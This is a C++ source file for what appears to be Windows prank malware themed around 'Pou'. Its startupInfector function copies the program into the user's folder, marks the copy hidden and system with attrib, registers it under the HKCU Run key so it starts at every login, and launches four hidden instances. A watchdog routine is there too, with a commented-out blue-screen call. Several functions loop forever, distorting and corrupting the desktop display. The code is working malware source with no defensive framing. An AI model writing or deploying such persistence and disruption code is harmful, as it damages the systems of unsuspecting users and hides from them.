#include "Common.h"


void startupInfector(string file, string newName) {


	string userPath = "C:\\Users\\" + username();
	cout << userPath << endl;

	string fullFilePath = "\"" + userPath + "\\" + newName + "\"";

	cout << fullFilePath;

	copyFile(file, userPath, newName);

	string attribCommand = "attrib +H +S +I +R " + userPath + "\\" + newName;
	WinExec(attribCommand.c_str(), SW_HIDE);
	
	setRegestryValue("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Pou", "REG_SZ", fullFilePath);

	string extraCommand = "start " + userPath + "\\" + newName + " --Extra";
	for (size_t i = 0; i < 4; i++)	// Start 4 other Pous
	{
		WinExec(extraCommand.c_str(), SW_HIDE);
	}

}


void pouVitalsCheck() {
    
	Sleep(2000);

	for (;;) {


		int firstCheck = getNumOfWindows();

		Sleep(10);

		if (firstCheck > getNumOfWindows()) {
			MessageBox(NULL, L"Crash Cancelled\nPayload.cpp : Line 45", L"Warning", MB_OK | MB_ICONWARNING); // Place Holder
			//BSOD();
		}
		
		  

	}

}

/*

void pouSaysHello() {
	//PlaySound(MAKEINTRESOURCE(IDR_WAVE1), GetModuleHandle(NULL), SND_ASYNC | SND_RESOURCE | SND_NOSTOP);

	//for (int i = 101; i < 222; i++) {
		BITMAP bm;

		HBITMAP Picture = reinterpret_cast<HBITMAP>(LoadImage(GetModuleHandle(nullptr), MAKEINTRESOURCEW(IDB_BITMAP1), IMAGE_BITMAP, 250, 250, LR_DEFAULTSIZE));
		
		

		HDC whdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(whdc);
		SelectObject(hdcMem, Picture);
		GetObject((HGDIOBJ)Picture, sizeof(bm), &bm);


		for (size_t i = 0; i < 100; i++)
		{



			BitBlt(whdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
			Sleep(2);
			BitBlt(whdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
			Sleep(2);
			BitBlt(whdc, 0, 0, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);

		}
		DeleteDC(hdcMem);
		DeleteObject(Picture);

		//Test2

	//}

}

*/

void RussianGdi() {
	srand(time(NULL));

	HDC desk;
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);

	int rx;
	int ry;
	for (;;)
	{
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		rx = rand() % sw;
		ry = rand() % sh;
		for (int i = 0; i < 17; i++)
		{
			desk = GetDC(0);
			BitBlt(desk, rx, rand() % 50 - 25, sw, sh, desk, rx, 0, SRCCOPY);
			BitBlt(desk, rx, rand() % 50 - 25, -sw, sh, desk, rx, 0, SRCCOPY);
			BitBlt(desk, rand() % 50 - 25, ry, sw, sh, desk, 0, ry, SRCCOPY);
			BitBlt(desk, rand() % 50 - 25, ry, -sw, sh, desk, 0, ry, SRCCOPY);
		}
	}
}


void RussianManCool() {
	int width;
	int height;
	HWND hwnd;
	HDC hdc;
	for (;;)
	{
		width = GetSystemMetrics(SM_CXSCREEN);
		height = GetSystemMetrics(SM_CYSCREEN);
		hwnd = GetDesktopWindow();
		hdc = GetDC(0);
		RECT rekt;
		GetWindowRect(hwnd, &rekt);
		HBRUSH rainbow = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, rainbow);
		int xyrng = rand() % width;
		int h = height - rand() % width - (width / 2 - 110);
		POINT pt3[3];

		int inc3 = 60;
		inc3++;

		pt3[0].x = rekt.left + inc3;
		pt3[0].y = rekt.top - inc3;
		pt3[1].x = rekt.right + inc3;
		pt3[1].y = rekt.top + inc3;
		pt3[2].x = rekt.left - inc3;
		pt3[2].y = rekt.bottom - inc3;

		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, 0, 0, width, height, SRCCOPY);
		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, 0, 0, width, height, SRCCOPY);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, 0, 0, width, height, SRCCOPY);
		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, 0, 0, width, height, SRCCOPY);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, 0, 0, width, height, SRCCOPY);
		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, 0, 0, width, height, SRCCOPY);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		PlgBlt(hdc, pt3, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		StretchBlt(hdc, -16, -16, width + 32, height + 32, hdc, 0, 0, width, height, SRCCOPY);
		StretchBlt(hdc, 16, 16, width - 32, height - 32, hdc, 0, 0, width, height, SRCCOPY);

		DeleteObject(rainbow);
	}
}


void Russ() {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	int a;
	int b;
	for (;;)
	{
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		a = rand() % sw;
		b = rand() % sh;
		BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCAND);
		BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
		BitBlt(desk, a, b, sw, sh, desk, a + tan(rand() % 21 - 10), b + tan(rand() % 21 - 10), SRCCOPY);
		BitBlt(desk, a, b, sw, sh, desk, a + sin(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
		BitBlt(desk, a, b, sw, sh, desk, a + tan(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
	}
}